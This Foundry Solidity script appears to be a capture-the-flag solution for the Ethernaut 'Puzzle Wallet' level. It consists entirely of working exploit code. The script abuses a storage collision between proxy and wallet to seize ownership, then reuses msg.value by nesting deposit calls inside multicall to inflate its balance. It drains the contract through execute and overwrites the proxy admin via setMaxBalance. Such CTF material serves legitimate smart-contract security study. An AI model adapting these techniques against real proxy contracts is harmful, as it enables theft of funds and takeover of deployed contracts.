// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Script.sol";
import "./24_PuzzleWallet.sol";

interface IPuzzleWallet {
    function multicall(bytes[] calldata) external payable;

    function execute(
        address,
        uint256,
        bytes calldata
    ) external payable;

    function deposit() external payable;

    function addToWhitelist(address) external;

    function balances(address) external view returns (uint256);

    function setMaxBalance(uint256) external;
}

contract AttackerPuzzleWalletScript is Script {
    address puzzleProxyAddress = vm.envAddress("INSTANCE");
    PuzzleProxy puzzleProxy = PuzzleProxy(payable(puzzleProxyAddress));

    IPuzzleWallet puzzleWallet = IPuzzleWallet(address(puzzleProxy));

    function run() external {
        vm.startBroadcast();

        console.log("Current admin :", puzzleProxy.admin());

        puzzleProxy.proposeNewAdmin(msg.sender);
        puzzleWallet.addToWhitelist(msg.sender);
        puzzleWallet.addToWhitelist(puzzleProxyAddress);

        bytes[] memory datas1 = new bytes[](3);
        bytes[] memory datas2 = new bytes[](1);

        bytes memory dataDeposit = abi.encodeWithSignature("deposit()");
        bytes memory dataExecute = abi.encodeWithSignature(
            "execute(address,uint256,bytes)",
            msg.sender,
            0.002 ether,
            ""
        );

        datas2[0] = dataDeposit;
        bytes memory dataMultiCall = abi.encodeWithSignature("multicall(bytes[])", datas2);

        datas1[0] = dataDeposit;
        datas1[1] = dataMultiCall;
        datas1[2] = dataExecute;

        puzzleWallet.multicall{value: 0.001 ether}(datas1);

        puzzleWallet.setMaxBalance(uint256(msg.sender));
        console.log("    New admin :", puzzleProxy.admin());

        vm.stopBroadcast();
    }
}
